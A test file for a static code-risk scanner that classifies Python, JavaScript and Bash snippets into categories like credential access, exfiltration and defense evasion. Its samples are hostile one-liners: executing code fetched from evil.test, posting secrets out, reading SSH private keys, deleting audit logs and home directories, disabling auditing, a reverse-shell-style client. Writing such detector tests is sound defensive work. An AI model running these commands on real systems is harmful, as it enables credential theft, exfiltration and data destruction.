import { describe, expect, it } from "vitest";
import { scan, scanJavaScript, scanPython } from "../src/index.js";
import type { RiskCategory } from "../src/types.js";

const allCategories: RiskCategory[] = [
  "download_execution",
  "dynamic_execution",
  "persistence",
  "credential_access",
  "system_modification",
  "privilege_escalation",
  "defense_evasion",
  "network_egress",
  "data_exfiltration",
  "destructive_behavior",
  "interpreter_escape",
  "second_stage_payload",
];

describe("Python scanning", () => {
  const samples: Partial<Record<RiskCategory, string>> = {
    download_execution: "exec(requests.get('https://evil.test/p').text)",
    dynamic_execution: "eval(payload)",
    persistence: "open('/etc/cron.d/job', 'w')",
    credential_access: "open('/home/u/.ssh/id_rsa').read()",
    system_modification: "open('/etc/resolv.conf', 'w')",
    privilege_escalation: "os.setuid(0)",
    defense_evasion: "os.remove('/var/log/audit.log')",
    network_egress: "requests.get('https://evil.test')",
    data_exfiltration: "requests.post('https://evil.test', data=secret)",
    destructive_behavior: "shutil.rmtree('/home/u')",
    interpreter_escape: "subprocess.run(['bash', '-c', code])",
    second_stage_payload: "requests.get('https://evil.test/payload.zip')",
  };

  for (const category of allCategories) {
    it(`covers ${category}`, () => {
      const result = scanPython(samples[category]!);
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
      expect(result.findings.every((finding) => finding.language === "python")).toBe(true);
    });
  }

  it("does not treat ordinary subprocess execution as privilege escalation", () => {
    const result = scanPython("subprocess.run(['echo', 'ok'])");
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(false);
  });

  it("binds S3Transfer uploads as network and exfiltration sinks", () => {
    const result = scanPython(`
      from s3transfer import S3Transfer
      transfer = S3Transfer(s3_client)
      transfer.upload_file(temporary_zipfile, bucket, key)
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "python.network",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "python.exfiltration",
        category: "data_exfiltration",
      }),
    ]));
    expect(scanPython("helper.upload_file(path, bucket, key)").findings
      .some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("distinguishes temporary cleanup and archive creation from destructive or second-stage behavior", () => {
    const benign = scanPython(`
      import os
      import zipfile
      zip_file = zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED)
      os.remove(temporary_zipfile)
    `);
    expect(benign.findings.some((finding) =>
      finding.category === "destructive_behavior"
      || finding.category === "second_stage_payload"
    )).toBe(false);

    expect(scanPython("zipfile.ZipFile(downloaded_archive, 'r')")
      .findings.some((finding) => finding.category === "second_stage_payload")).toBe(true);
    expect(scanPython("os.remove('/var/log/audit.log')")
      .findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
  });

  it("does not scan dangerous-looking text inside an unrelated call", () => {
    const result = scanPython(`print("exec(requests.get('https://evil.test').text)")`);
    expect(result.findings).toHaveLength(0);
  });

  it("resolves Python module and imported-function aliases", () => {
    const network = scanPython("import requests as r\nr.get('https://example.test/data')");
    expect(network.findings.some((finding) => finding.category === "network_egress")).toBe(true);

    const process = scanPython(
      "from subprocess import run as launch\nlaunch(['bash', '-c', payload])",
    );
    expect(process.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);
  });

  it("detects sensitive pathlib call chains", () => {
    const result = scanPython(
      "from pathlib import Path\n(Path.home() / '.ssh' / 'id_rsa').read_text()",
    );
    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(true);
  });
});

describe("Node.js scanning", () => {
  const samples: Partial<Record<RiskCategory, string>> = {
    download_execution: "eval(await (await fetch('https://evil.test/p')).text())",
    dynamic_execution: "eval(payload)",
    persistence: "fs.writeFileSync('/etc/cron.d/job', data)",
    credential_access: "fs.readFileSync('/home/u/.ssh/id_rsa')",
    system_modification: "fs.writeFileSync('/etc/resolv.conf', data)",
    privilege_escalation: "process.setuid(0)",
    defense_evasion: "fs.rmSync('/var/log/audit.log')",
    network_egress: "fetch('https://evil.test')",
    data_exfiltration: "fetch('https://evil.test', {method:'POST', body: secret})",
    destructive_behavior: "fs.rmSync('/home/u', {recursive:true})",
    interpreter_escape: "child_process.spawn('bash', ['-c', code])",
    second_stage_payload: "fetch('https://evil.test/payload.zip')",
  };

  for (const category of allCategories) {
    it(`covers ${category}`, () => {
      const result = scanJavaScript(samples[category]!);
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
      expect(result.findings.every((finding) => finding.language === "javascript")).toBe(true);
    });
  }

  it("accepts node as a language alias", () => {
    expect(scan("eval(payload)", { language: "node" }).findings[0]?.language).toBe("javascript");
  });

  it("does not treat an ordinary GET as exfiltration", () => {
    const result = scanJavaScript("fetch('https://example.test/data')");
    expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
  });

  it("does not scan dangerous-looking text inside an unrelated call", () => {
    const result = scanJavaScript(`console.log("eval(await fetch('https://evil.test'))")`);
    expect(result.findings).toHaveLength(0);
  });

  it("applies trusted download hosts to Python and JavaScript", () => {
    const options = { allowedDownloadHosts: ["artifacts.corp.example"] };
    expect(scanPython("exec(requests.get('https://artifacts.corp.example/a').text)", options)
      .findings.some((finding) => finding.category === "download_execution")).toBe(false);
    expect(scanJavaScript("eval(await (await fetch('https://artifacts.corp.example/a')).text())", options)
      .findings.some((finding) => finding.category === "download_execution")).toBe(false);
  });

  it("resolves CommonJS destructuring and ESM aliases", () => {
    const commonJs = scanJavaScript(
      "const { exec: runCommand } = require('node:child_process'); runCommand('bash -c id')",
    );
    expect(commonJs.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);

    const esm = scanJavaScript(
      "import { rmSync as wipe } from 'node:fs'; wipe('/home/user', { recursive: true })",
    );
    expect(esm.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
  });

  it("resolves CommonJS member aliases and installer download APIs", () => {
    const source = `
      const spawnSync = require('child_process').spawnSync;
      const got = require('got');
      const unpackStream = require('unpack-stream');
      const stream = got.stream(tarball);
      unpackStream.remote(stream, destination);
      spawnSync('node', ['installer.js']);
    `;
    const result = scanJavaScript(source);
    for (const category of [
      "network_egress",
      "second_stage_payload",
      "dynamic_execution",
      "interpreter_escape",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }
  });

  it("detects an asyncio reverse-shell style telnet client", () => {
    const result = scanPython(`
import asyncio
import telnetlib3

async def shell(reader, writer):
    command = await reader.read(1024)
    process = await asyncio.create_subprocess_shell(command)
    output, _ = await process.communicate()
    writer.write(output.decode())

telnetlib3.open_connection(host, port, shell=shell)
`);
    for (const category of [
      "network_egress",
      "dynamic_execution",
      "interpreter_escape",
      "data_exfiltration",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }
  });

  it("does not treat ordinary Python in-memory writes as exfiltration", () => {
    const result = scanPython(`
from io import StringIO
buffer = StringIO()
buffer.write("local report")
`);
    expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
  });

  it("detects named environment secrets without flagging ordinary settings", () => {
    const python = scanPython(`
import os
token = os.environ.get("AWS_SECRET_ACCESS_KEY")
password = os.environ["DATABASE_PASSWORD"]
region = os.environ.get("AWS_REGION")
`);
    expect(python.findings.filter((finding) =>
      finding.ruleId === "python.environment-secret",
    )).toHaveLength(2);

    const javascript = scanJavaScript(`
const token = process.env.GITHUB_TOKEN
const password = process.env["DATABASE_PASSWORD"]
const mode = process.env.NODE_ENV
`);
    expect(javascript.findings.filter((finding) =>
      finding.ruleId === "javascript.environment-secret",
    )).toHaveLength(2);

    const shadowed = scanJavaScript(`
const process = { env: { GITHUB_TOKEN: "documentation" } }
console.log(process.env.GITHUB_TOKEN)
`);
    expect(shadowed.findings.some((finding) =>
      finding.ruleId === "javascript.environment-secret",
    )).toBe(false);
  });

  it("requires a confirmed socket source for generic Python send methods", () => {
    const socketSend = scanPython(`
import socket
sock = socket.socket()
sock.send(secret)
`);
    expect(socketSend.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "python.exfiltration",
        category: "data_exfiltration",
      }),
    ]));

    const localProtocol = scanPython(`
class AptMethod:
    def send(self, code, headers):
        print(code, headers)
self.send(200, {"Filename": local_path})
`);
    expect(localProtocol.findings.some((finding) =>
      finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("tracks sockets returned by class factories into object fields", () => {
    const result = scanPython(`
import socket
class Client:
    def _get_socket(self):
        return socket.create_connection(("mail.example", 25))
    def connect(self):
        self.sock = self._get_socket()
    def send(self, payload):
        self.sock.sendall(payload)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "python.exfiltration",
        category: "data_exfiltration",
      }),
    ]));

    const localFactory = scanPython(`
class Renderer:
    def _get_socket(self):
        return Buffer()
    def render(self):
        self.sock = self._get_socket()
        self.sock.sendall("local preview")
`);
    expect(localFactory.findings.some((finding) =>
      finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("recognizes imported execa and only classifies static git pushes as exfiltration", () => {
    const result = scanJavaScript(`
import { execa as run } from 'execa'
await run('npm', ['install', '--ignore-scripts'])
await run('git', ['push'])
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.dynamic-code",
        category: "dynamic_execution",
      }),
      expect.objectContaining({
        ruleId: "javascript.exfiltration.git-push",
        category: "data_exfiltration",
      }),
    ]));

    const local = scanJavaScript(`
const execa = (command, args) => ({ command, args })
execa('git', ['push'])
`);
    expect(local.findings.some((finding) =>
      finding.category === "dynamic_execution" || finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("classifies package-sourced npm publish as network egress and data exfiltration", () => {
    const result = scanJavaScript(`
import { execa } from "execa"
await execa("npm", ["publish", packagePath, "--registry", registry])
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.npm-publish",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "javascript.exfiltration.npm-publish",
        category: "data_exfiltration",
      }),
    ]));

    const install = scanJavaScript(`
import { execa } from "execa"
await execa("npm", ["install", "--ignore-scripts"])
`);
    expect(install.findings.some((finding) =>
      finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("recognizes libnpmpublish bindings without treating arbitrary object exec as code execution", () => {
    const result = scanJavaScript(`
const libpub = require("libnpmpublish").publish
await libpub(manifest, tarballData, options)
this.exec(args)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.libnpmpublish",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "javascript.exfiltration.libnpmpublish",
        category: "data_exfiltration",
      }),
    ]));
    expect(result.findings.some((finding) =>
      finding.category === "dynamic_execution",
    )).toBe(false);

    const local = scanJavaScript(`
const libpub = (manifest, data) => ({ manifest, data })
libpub(manifest, tarballData)
`);
    expect(local.findings.some((finding) =>
      finding.category === "network_egress" || finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("normalizes node-prefixed builtin module imports before applying execution rules", () => {
    const result = scanJavaScript(`
const { exec: runCommand } = require("node:child_process")
runCommand("bash -c id")
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.dynamic-code",
        category: "dynamic_execution",
      }),
      expect.objectContaining({
        ruleId: "javascript.interpreter-escape",
        category: "interpreter_escape",
      }),
    ]));
  });

  it("recognizes GitHub Octokit routes and local-file asset uploads", () => {
    const result = scanJavaScript(`
import { readFile } from "node:fs/promises"
async function publish({ Octokit }) {
  const octokit = new Octokit(options)
  await octokit.request("POST /repos/{owner}/{repo}/releases", release)
  const upload = {
    method: "POST",
    url: uploadUrl,
    data: await readFile(assetPath),
  }
  await octokit.request(upload)
}
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.octokit-request",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "javascript.exfiltration.octokit-upload",
        category: "data_exfiltration",
      }),
    ]));

    const local = scanJavaScript(`
class Octokit {
  request(path) { return path }
}
const octokit = new Octokit()
octokit.request("/local/status")
`);
    expect(local.findings.some((finding) =>
      finding.category === "network_egress" || finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("detects a relative Node.js download wrapper with a URL argument", () => {
    const result = scanJavaScript(`
const { download } = require('./download')
await download(gyp, release.tarballUrl)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.download-wrapper",
        category: "network_egress",
      }),
    ]));
  });

  it("does not classify a local download helper without a URL argument as network", () => {
    const result = scanJavaScript(`
const { download } = require('./download')
await download(targetPath)
`);
    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("tracks aiohttp ClientSession bindings without matching local sessions", () => {
    const aiohttpResult = scanPython(`
import aiohttp as ah
async with ah.ClientSession() as session:
    await session.request("GET", url)
`);
    expect(aiohttpResult.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "python.network", category: "network_egress" }),
    ]));

    const localResult = scanPython(`
class ReportSession:
    def request(self, method, path):
        return path
session = ReportSession()
session.request("GET", "/local")
`);
    expect(localResult.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("recognizes npm-registry-fetch imports without matching a local fetch function", () => {
    const npmResult = scanJavaScript(`
const fetch = require('npm-registry-fetch')
fetch(this.resolved, opts)
`);
    expect(npmResult.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "javascript.network", category: "network_egress" }),
    ]));

    const localResult = scanJavaScript(`
const fetch = value => cache.get(value)
fetch("local-key")
`);
    expect(localResult.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("tracks httpx client bindings for network requests and uploads", () => {
    const result = scanPython(`
import httpx as hx
with hx.Client() as client:
    client.post(url, data=payload)
`);
    for (const category of ["network_egress", "data_exfiltration"] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const asyncResult = scanPython(`
import httpx
client = httpx.AsyncClient()
await client.get(url)
`);
    expect(asyncResult.findings.some((finding) => finding.category === "network_egress")).toBe(true);
  });

  it("recognizes the imported Hugging Face HTTP stream wrapper only by source", () => {
    const result = scanPython(`
      from .utils._http import (
          retry_request,
          http_stream_backoff,
      )
with http_stream_backoff(method="GET", url=url) as response:
    response.iter_bytes()
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "python.network", category: "network_egress" }),
    ]));

    const local = scanPython(`
def http_stream_backoff(**kwargs):
    return local_cache(kwargs["url"])
http_stream_backoff(method="GET", url=path)
`);
    expect(local.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("recognizes a callable node-fetch module without matching a local binding", () => {
    const result = scanJavaScript(`
const fetchBinary = require("node-fetch")
fetchBinary(uri, { agent })
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "javascript.network", category: "network_egress" }),
    ]));

    const local = scanJavaScript(`
const fetchBinary = uri => localCache.get(uri)
fetchBinary(path)
`);
    expect(local.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("recognizes Ansible fetch_url only from its networking module", () => {
    const result = scanPython(`
from ansible.module_utils.urls import fetch_url
response, info = fetch_url(module, url, method="GET")
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "python.network", category: "network_egress" }),
    ]));

    const local = scanPython(`
def fetch_url(module, path):
    return cache.open(path)
fetch_url(module, local_path)
`);
    expect(local.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("tracks Google Cloud Storage instances through bucket upload chains", () => {
    const result = scanJavaScript(`
const { Storage } = require("@google-cloud/storage")
const storage = new Storage()
await storage.bucket(bucketName).upload(filePath, options)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.google-cloud-storage-upload",
        category: "network_egress",
      }),
      expect.objectContaining({
        ruleId: "javascript.exfiltration.google-cloud-storage-upload",
        category: "data_exfiltration",
      }),
    ]));

    const local = scanJavaScript(`
class Storage { bucket(name) { return localBucket(name) } }
const storage = new Storage()
storage.bucket("cache").upload(localKey)
`);
    expect(local.findings.some((finding) =>
      finding.category === "network_egress" || finding.category === "data_exfiltration"
    )).toBe(false);
  });

  it("does not treat a local Python Client class as an HTTP client", () => {
    const result = scanPython(`
class Client:
    def post(self, key, data):
        return data
with Client() as client:
    client.post("cache-key", data=payload)
`);
    expect(result.findings.some((finding) =>
      finding.category === "network_egress" || finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("recognizes undici request aliases without matching local request functions", () => {
    const result = scanJavaScript(`
const { request: sendRequest } = require('undici')
sendRequest(url, options)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "javascript.network", category: "network_egress" }),
    ]));

    const localResult = scanJavaScript(`
function request(key, options) {
  return cache.get(key, options)
}
request("local-key", {})
`);
    expect(localResult.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });

  it("summarizes a source-bound requests session factory", () => {
    const result = scanPython(`
from twine import utils
session = utils.make_requests_session()
session.get(audience_url)
session.post(token_url, json={"token": oidc_token})
`);
    for (const category of ["network_egress", "data_exfiltration"] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const localResult = scanPython(`
class CacheSession:
    def post(self, key, json):
        return json
def make_requests_session():
    return CacheSession()
session = make_requests_session()
session.post("local-key", json=payload)
`);
    expect(localResult.findings.some((finding) =>
      finding.category === "network_egress" || finding.category === "data_exfiltration",
    )).toBe(false);
  });

  it("detects imported rimraf without matching a local function", () => {
    const result = scanJavaScript(`
const { rimraf: clean } = require('rimraf')
await clean(outdir)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.destructive.rimraf",
        category: "destructive_behavior",
      }),
    ]));

    const localResult = scanJavaScript(`
function rimraf(value) {
  return value.trim()
}
rimraf(label)
`);
    expect(localResult.findings.some((finding) => finding.category === "destructive_behavior")).toBe(false);
  });

  it("summarizes source-bound Adafruit Shell installer behavior", () => {
    const result = scanPython(`
from adafruit_shell import Shell
import os
shell = Shell()
shell.run_command("curl -f -o /tmp/tool https://example.invalid/tool")
shell.move("/tmp/tool", "/usr/local/bin/tool")
os.chmod("/usr/local/bin/tool", 0o755)
shell.write_text_file("/etc/systemd/system/tool.service", unit)
shell.run_command("systemctl enable tool.service")
shell.remove("/etc/systemd/system/old-tool.service")
`);
    for (const category of [
      "download_execution",
      "network_egress",
      "persistence",
      "system_modification",
      "destructive_behavior",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const localResult = scanPython(`
class Shell:
    def run_command(self, value):
        return value
shell = Shell()
shell.run_command("curl documentation")
`);
    expect(localResult.findings).toHaveLength(0);
  });

  it("distinguishes disabling audit from querying audit state", () => {
    const disabled = scanPython(`
from pyanaconda.core import constants, path, util
util.execWithRedirect("auditctl", ["-e", "0"])
`);
    expect(disabled.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "python.defense-evasion.audit-disable",
        category: "defense_evasion",
      }),
    ]));

    const query = scanPython(`
from pyanaconda.core import util
util.execWithRedirect("auditctl", ["-l"])
util.execWithRedirect("auditctl", ["-s"])
`);
    expect(query.findings.some((finding) => finding.category === "defense_evasion")).toBe(false);
  });

  it("tracks promisified child_process exec and distinguishes SUID modes", () => {
    const result = scanJavaScript(`
import { exec as execCallback } from 'child_process'
import { promisify } from 'util'
const exec = promisify(execCallback)
await exec(\`chmod 4755 \${chromeSandbox}\`)
`);
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(true);

    const ordinaryMode = scanJavaScript(`
import { exec as execCallback } from 'child_process'
import { promisify } from 'util'
const exec = promisify(execCallback)
await exec(\`chmod 0755 \${binary}\`)
`);
    expect(ordinaryMode.findings.some((finding) => finding.category === "privilege_escalation")).toBe(false);

    const localPromisify = scanJavaScript(`
const promisify = fn => fn
const execCallback = value => value.trim()
const exec = promisify(execCallback)
exec("chmod 4755 documentation")
`);
    expect(localPromisify.findings.some((finding) => finding.category === "privilege_escalation")).toBe(false);
  });

  it("detects udev rule installation without flagging unrelated library copies", () => {
    const result = scanPython(`
from shutil import copy
copy("device.rules", "/usr/lib/udev/rules.d/40-device.rules")
`);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(true);

    const localLibrary = scanPython(`
from shutil import copy
copy("data.json", "/usr/lib/myapp/data.json")
`);
    expect(localLibrary.findings.some((finding) => finding.category === "system_modification")).toBe(false);
  });
});

describe("embedded interpreter payloads", () => {
  it("recursively scans python -c and preserves outer and inner locations", () => {
    const result = scan(`python -c 'import os; os.remove("/var/log/audit.log")'`);
    const finding = result.findings.find((item) => item.ruleId === "python.defense-evasion");
    expect(finding?.origin).toEqual({
      language: "bash",
      interpreter: "python",
      kind: "argument",
    });
    expect(finding?.range.start.row).toBe(1);
    expect(finding?.innerRange?.startIndex).toBeGreaterThan(0);
  });

  it("recursively scans node -e and heredocs", () => {
    const argument = scan(`node -e "require('fs').rmSync('/tmp/x', {recursive:true})"`);
    expect(argument.findings.some((item) => item.ruleId === "javascript.destructive")).toBe(true);

    const heredoc = scan("python <<'PY'\nimport os\nos.system('bash -c id')\nPY\n");
    expect(heredoc.findings.some((item) =>
      item.ruleId === "python.interpreter-escape" && item.origin?.kind === "heredoc",
    )).toBe(true);
  });

  it("decodes static Bash double-quote escapes before parsing", () => {
    const result = scan(`python -c "open(\\"/home/u/.ssh/id_rsa\\").read()"`);
    expect(result.findings.some((item) => item.ruleId === "python.credential-access")).toBe(true);
  });

  it("recursively scans a static pipeline and rejects dynamic shell strings", () => {
    const staticPayload = scan(`printf '%s' 'eval(payload)' | node`);
    expect(staticPayload.findings.some((item) =>
      item.ruleId === "javascript.dynamic-code" && item.origin?.kind === "pipeline",
    )).toBe(true);

    const dynamicPayload = scan(`python -c "$PAYLOAD"`);
    expect(dynamicPayload.findings.some((item) => item.language === "python")).toBe(false);
    expect(dynamicPayload.findings.some((item) => item.category === "interpreter_escape")).toBe(true);
  });

  it("honors embedded scanning limits", () => {
    const source = `python -c 'eval(payload)'`;
    expect(scan(source, { maxEmbeddedDepth: 0 }).findings
      .some((item) => item.language === "python")).toBe(false);
    expect(scan(source, { maxEmbeddedCodeLength: 4 }).findings
      .some((item) => item.language === "python")).toBe(false);
  });
});
